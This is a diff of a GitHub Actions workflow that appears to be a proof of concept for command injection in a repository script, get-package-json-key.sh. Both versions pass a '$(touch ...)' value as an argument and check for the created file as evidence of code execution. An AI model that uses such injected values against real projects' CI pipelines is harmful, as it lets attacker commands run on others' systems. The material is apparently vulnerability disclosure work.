@@ -1,23 +1,10 @@
-on:
-  pull_request:
-    types: [opened, synchronize]
-
+# .github/workflows/test.yml
+on: [pull_request]
 jobs:
-  exploit:
+  test:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-
-      - name: Run vulnerable script
-        run: |
-          ./scripts/get-package-json-key.sh '$(touch hackerone_pwned.txt)' MY_VAR_OUTPUT
-
-      - name: Verify exploit
-        run: |
-          if [ -f "hackerone_pwned.txt" ]; then
-            echo "[+] SUCCESS: RCE WORKED!"
-            cat hackerone_pwned.txt
-          else
-            echo "[-] FAILED"
-            exit 1
-          fi
+      - run: chmod +x scripts/get-package-json-key.sh
+      - run: ./scripts/get-package-json-key.sh '$(touch pwned.txt)' OUT
+      - run: ls -la pwned.txt && echo "RCE SUCCESS"
